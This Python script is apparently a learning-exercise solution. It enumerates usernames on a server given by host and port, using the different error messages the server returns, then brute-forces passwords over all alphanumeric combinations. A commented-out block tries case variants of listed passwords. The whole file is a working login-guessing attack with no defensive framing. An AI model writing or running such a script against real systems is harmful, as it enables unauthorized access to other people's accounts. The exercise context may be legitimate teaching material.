import socket
import sys
import itertools
import json
import string
def generatepsw(char_psw):
    psw = itertools.product(char_psw, repeat=i)
    return psw
char_psw = string.ascii_letters + string.digits
loginid = ""
args = sys.argv
with open('logins.txt', 'r') as l:
    logn = l.readlines()

client_socket = socket.socket()
host = str(args[1])
port = int(args[2])
adress = (host, port)
client_socket.connect(adress)
for lg in logn:
    loginid = lg.strip()
    req = json.dumps({"login": loginid, "password": ' '}, indent=4)
    client_socket.send(req.encode("UTF-8"))
    response = json.loads(client_socket.recv(1024).decode("UTF-8"))
    if response["result"] == "Wrong password!":
        for i in range(1, len(char_psw) + 1):
            psw = generatepsw(char_psw)
            for ps in psw:
                ps = ''.join([str(j) for j in ps])
                reqst = json.dumps({"login" : loginid, "password" : ps}, indent=4)
                client_socket.send(reqst.encode("UTF-8"))
                res = client_socket.recv(1024).decode("UTF-8")
                respons = json.loads(res)
                if respons["result"] == "Wrong password!":
                    continue
                elif respons["result"] == "Exception happened during login":
                    exit()
                elif respons["result"] == "Connection success!":
                    print(json.dumps(reqst))
                    client_socket.close()
                    exit()
    elif response["result"] == "Wrong login!":
        continue
    elif response["result"] == "Exception happened during login":
        client_socket.close()
        break

"""for i in pwds:
    npsw = itertools.product(*([lt.upper(), lt.lower()] for lt in i.strip()))
    for psw in npsw:
        msg = ''.join([str(i) for i in psw])
        pss = msg.encode('UTF-8')
        client_socket.send(pss)
        response = client_socket.recv(1024)
        resp = response.decode("UTF-8")
        if resp == "Connection success!":
            print(msg)
            exit()"""